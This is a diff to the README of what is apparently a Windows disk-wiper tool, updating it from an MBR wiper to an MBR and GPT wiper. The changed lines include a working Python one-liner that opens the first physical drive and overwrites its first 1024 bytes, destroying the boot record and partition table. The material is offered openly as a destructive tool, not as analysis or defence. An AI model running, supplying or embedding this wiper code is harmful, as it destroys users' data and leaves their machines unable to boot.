@@ -4,7 +4,7 @@
 
 ## Description
 
-This file implements a little MBR Wiper.
+This file implements a little MBR and GPT Wiper.
 
 ## Requirements
 
@@ -53,10 +53,10 @@ strip MbrWiper.exe
 MbrWiper.exe
 ```
 
-## MBR Wiper in python oneliner
+## MBR and GPT Wiper in python oneliner
 
 ```python
-open("\\\\.\\PHYSICALDRIVE0", "rb+").write(b"a" * 512)
+open("\\\\.\\PHYSICALDRIVE0", "rb+").write(b"a" * 1024)
 ```
 
 ## Links
